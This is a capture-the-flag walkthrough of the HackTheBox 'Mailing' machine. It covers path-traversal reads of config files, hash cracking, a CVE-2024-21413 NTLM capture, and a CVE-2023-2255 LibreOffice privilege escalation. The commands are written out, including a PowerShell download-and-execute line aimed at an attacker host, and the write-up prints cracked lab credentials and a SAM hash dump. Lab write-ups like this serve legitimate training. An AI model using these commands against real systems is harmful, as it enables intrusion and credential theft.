## Reconnaissance

### nmap 

![](./IMG/0.png)

![](./IMG/1.png)
### Gobuster 

![](./IMG/3.png)
### WebService 

> Top page 

![](./IMG/2.png)

> instructions, download instructions pdf 

![](./IMG/6.png)

![](./IMG/7.png)

> In here, I know how the author set up hmailserver 
> Information:

1. hmailserver 
2. user@mailing.htb
3. user: password ( maybe just a example credential)

![](./IMG/8.png)

> Check web source 
> the instruction download link as follow

![](./IMG/4.png)

![](./IMG/5.png)


> Tried to access download page 

![](./IMG/9.png)


## Exploit 

> With the information in URL for download page , I tried to do LFI in here 

```
../download.php
```

![](./IMG/14.png)

```
../index.php
```

![](./IMG/10.png)

![](./IMG/11.png)

> Since I know that is a windows system (information from nmap results)
> Tried the following 

```
../../../../../../../../Window/System32/drivers/etc/hosts
```

![](./IMG/12.png)

![](./IMG/13.png)

> Read web config 

```
../../../../../../../../../../../../../inetpub/wwwroot/web.config
```
![](./IMG/15.png)

![](./IMG/16.png)

![](./IMG/17.png)

> Research for hmailserver 

- [Ini-file settings](https://www.hmailserver.com/documentation/v5.4/?page=reference_inifilesettings)

![](./IMG/18.png)

![](./IMG/19.png)

![](./IMG/20.png)

- [hmailserver on windows 10](https://www.hmailserver.com/forum/viewtopic.php?t=34738)

![](./IMG/21.png)

> Possible path from following discussion

- [Possible dumb question...](https://www.hmailserver.com/forum/viewtopic.php?t=38903)

```
c:\program files (x86\hMailServer\Bin\hMailServer.ini
```

![](./IMG/28.png)


> Check the hmailserver config by LFI (hmailServer.ini)

```
../../../../../../../../Program+Files+(x86)/hMailServer/bin/hmailserver.ini
```


![](./IMG/22.png)

> Find administrator password

```
841bb5acfa6779ae432fd7a4e6600ba7
```

![](./IMG/23.png)

> And there is a MSSQLCE password

```
0a9f8ad8bf896b501dde74f08efd7e4c
```

![](./IMG/24.png)

```
../../../../../../../../Program+Files+(x86)/hMailServer/Logs/hmailserver_awstats.log
```

![](./IMG/25.png)

> Crack administrator password 

```
hashcat -m 500 administrator /usr/share/wordlists/rockyou.txt
```

![](./IMG/29.png)

```
administrator / homenetworkingadministrator
```

![](./IMG/30.png)

> Crack user password  --> Failed

```
hashcat -m 500 user /usr/share/wordlists/rockyou.txt
```

![](./IMG/31.png)

![](./IMG/32.png)

> Some other files related to hMailserver

- DecryptBlowfish.vbs
- hmailserver.sdf

```
../../../../../../../../Program+Files+(x86)/hMailServer/Addons/Utilities/DecryptBlowfish.vbs
```

![](./IMG/26.png)

![](./IMG/27.png)


### hmailserver CVE 

> Research CVE for hmailserver 
> A latest CVE show in search result - CVE-2024-21413

![](./IMG/33.png)


- [(GITHUB)Exploit Code - CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413/blob/main/README.md)

![](./IMG/34.png)

![](./IMG/35.png)

> Following the step
> Launch Responder 

```
Responder -I tun0 -v 
```

> Download and launch the payload 

```
python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.com --recipient maya@mailing.com --url '\\10.10.14.122\test' --subject 'HEYHEY'
```

![](./IMG/37.png)

> Receive maya's NTLMv2 hashes

![](./IMG/36.png)

> Hashcat crack NTLMv2 

```
ashcat -m 5600 maya /usr/share/wordlists/rockyou.txt
```

> Get plaintext credential 
```
maya / m4y4ngs4ri
```

![](./IMG/38.png)

### Telnet access SMTP /IMAP /POP3

> Using the password from hmailserver to access mail service
> Just confirm the credential works, and find some mail but not useful now 

```
telnet 10.10.11.14 110
```

![](./IMG/39.png)

![](./IMG/40.png)

> Find user flag 

![](./IMG/53.png)

## Privilege Escalation 

> Using maya's credential to login by winrm 

```
evil-winrm -i 10.10.11.14 -u maya -p "m4y4ngs4ri"
```

![](./IMG/41.png)

> Check user privilege permission

![](./IMG/42.png)

> Check Users' directroy contents

![](./IMG/43.png)

> Check C directory's content

![](./IMG/44.png)

> Check PHP directory content

![](./IMG/45.png)

> Winpeas Result

![](./IMG/46.png)

![](./IMG/47.png)

![](./IMG/48.png)

![](./IMG/49.png)

> Following the results, I can't find anything useful 
> Even the mail.py, I checked the content, I still can't find anything useful to escalate.
> mail.py 

```
from pywinauto.application import Application
from pywinauto import Desktop
from pywinauto.keyboard import send_keys
from time import sleep

app = Application(backend="uia").connect(title_re="Inbox*")
dlg = app.top_window()
current_count = 0
remove = 2
while True:
        try:
                unread = dlg.InboxListBox
                items = unread.item_count()
                if items==1:
                        sleep(20)
                        continue
                if items != current_count:
                        for i in range(1,items-current_count-(remove-1)):
                                if "Yesterday" in unread.texts()[i][0]:
                                        remove = 3
                                        continue
                                unread[i].select()
                                message = dlg.child_window(auto_id="RootFocusControl", control_type="Document").Hyperlink.invoke()
                                sleep(45)
                                dlg.type_keys("{ENTER}")
                                unread[i].select()
                        current_count = items - remove
                sleep(20)
        except:
                pass
```

> Then I checed the following writeup 

1. [Write-up 1](https://blog.csdn.net/m0_52742680/article/details/138482768)
2. [Write-up 2](https://blog.csdn.net/weixin_45557138/article/details/138790076)
3. [Write-up 3](https://medium.com/@Infinite_Exploit/mailing-writeup-htb-9f3ef005b70c)
4. [Write-up 4](https://blog.taipanbyte.ru/hackthebox/Mailing-HTB-Writeup)

> All of them are point to same document - Libreoffice 

![](./IMG/50.png)

> I also find the version 
> LibreOffice 7.4 

![](./IMG/51.png)

> CVE for libreOffice - CVE-2023-2255

```
LibreOffice supports "Floating Frames", similar to a html IFrame. The frames display their linked document in a floating frame inside the host document.

In affected versions of LibreOffice these floating frames fetch and display their linked document without prompt on loading the host document. This was inconsistent with the behavior of other linked document content such as OLE objects, Writer linked sections or Calc WEBSERVICE formulas which warn the user that there are linked documents and prompts if they should be allowed to update.

In versions >= 7.4.7 (and >= 7.5.3) the existing "update link" manager has been expanded to additionally control the update of the content of IFrames, so such IFrames will not automatically refresh their content unless the user agrees via the prompts.

Thanks to Amel Bouziane-Leblond for discovering this flaw.
```

### Exploit to LibreOffice

- [(GITHUB)CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255)

> Follow the exploit instruction 

![](./IMG/52.png)

> Executing the PoC
> I tried to set the payload to the following, but failed 

```
python exp.py --cmd "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.122/exp.ps1');" --output "exploit.odt"
```

> Then I set the payload as net command to add current user to high privilege group 

```
python CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt' 
```

![](./IMG/54.png)

> And upload to target server 

```
iwr -uri http://10.10.14.122/exploit.odt -OutFile exploit.odt
```

![](./IMG/55.png)

> Check the local group which maya in it

1. Remote Management Use
2. Usuarios
3. Usuarios de escritori

![](./IMG/56.png)

> Wait a while, and check it again
> 1 new group in it


![](./IMG/57.png)

> Now back to my kali
> Since maya is Administradores's group now 
> Using crackmapexec to get other credetnial from sam 


```
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c:::
localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::
```

![](./IMG/58.png)

> Using adminisrador to login by winrm / wmiexec -- Failed 

![](./IMG/59.png)

> Using localadmin to login - success

![](./IMG/60.png)

> Get root flag

![](./IMG/61.png)

## Reference 

### Discussion 

- [Discussion](https://forum.hackthebox.com/t/official-mailing-discussion/312373/97)
### Write up

1. [Write-up 1](https://blog.csdn.net/m0_52742680/article/details/138482768)
2. [Write-up 2](https://blog.csdn.net/weixin_45557138/article/details/138790076)
3. [Write-up 3](https://medium.com/@Infinite_Exploit/mailing-writeup-htb-9f3ef005b70c)
4. [Write-up 4](https://blog.taipanbyte.ru/hackthebox/Mailing-HTB-Writeup)


### Web Exploit - LFI 

- [Turning LFI into RCE by sending emails via SMTP and other LFI’s](https://pswalia2u.medium.com/turning-lfi-into-rce-by-sending-emails-via-smtp-58b499a81de3)
### hmailServer

- [Ini-file settings](https://www.hmailserver.com/documentation/v5.4/?page=reference_inifilesettings)
- [hmailserver on windows 10](https://www.hmailserver.com/forum/viewtopic.php?t=34738)
- [Possible dumb question...](https://www.hmailserver.com/forum/viewtopic.php?t=38903)
- [hMailServer folder structure](https://www.hmailserver.com/documentation/v5.4/?page=folderstructure)
- [(GITHUB)hmailserver](https://github.com/hmailserver/hmailserver)
- [(NOT Useful here)(GITHUB)hmailserver password decrypt](https://github.com/mvdnes/hm_decrypt)

#### Exploit 

- [(GITHUB)Exploit Code - CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413/blob/main/README.md)
- [(FreeBuf)CVE-2024-21413](https://m.freebuf.com/vuls/396256.html)
- [(GITHUB)CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability?tab=readme-ov-file)
- [恶意代码漏洞分析：CVE-2024-21413](https://www.yunyawu.com/2024/02/29/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9Acve-2024-21413/)

### Privilege Escalation LibreOffice

- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-2255)
- [(YouTube)CVE-2023-2255](https://www.youtube.com/watch?v=uBwOLYdNIB0)
#### Exploit 
- [(GITHUB)CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255)

### SMB
- [(HackTricks)139,445 - Pentesting SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)

### POP 
- [(HackTricks)110,995 - Pentesting POP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop)

### SMTP
- [(HackTricks)25,465,587 - Pentesting SMTP/s](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp)
- [How to Test SMTP AUTH using Telnet](https://www.ndchost.com/wiki/mail/test-smtp-auth-telnet)

![](./IMG/62.png)

### Privilege Escalation

- [powershell反弹shell常见方式](https://docs.ioin.in/writeup/www.anquanke.com/_post_id_99793/index.html)
- [Python Reverse Shell](https://github.com/orestisfoufris/Reverse-Shell---Python/blob/master/reverseshell.py)


###### tags: `HackTheBox`